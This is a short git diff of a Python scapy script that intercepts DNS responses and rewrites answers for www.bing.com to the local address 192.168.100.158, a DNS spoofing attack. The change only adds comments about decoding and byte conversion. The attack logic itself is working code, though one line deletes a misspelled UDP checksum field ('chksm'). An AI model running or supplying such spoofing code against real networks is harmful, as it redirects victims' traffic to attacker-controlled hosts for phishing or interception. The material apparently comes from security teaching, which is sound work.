@@ -7,7 +7,7 @@ def process_packet(packet):
     my_packet = scapy.IP(packet.get_payload())
     if my_packet.haslayer(scapy.DNSRR):
         qname = my_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname.decode():
+        if "www.bing.com" in qname.decode():  # string expected hence .decode()
             print("[+] Spoofing target...")
             answer = scapy.DNSRR(rrname=qname, rdata="192.168.100.158")
             my_packet[scapy.DNS].an = answer
@@ -18,7 +18,7 @@ def process_packet(packet):
             del my_packet[scapy.UDP].chksm
             del my_packet[scapy.UDP].len
 
-            packet.set_payload(bytes(my_packet))
+            packet.set_payload(bytes(my_packet))  # set_payload expects bytes
 
     packet.accept()
 
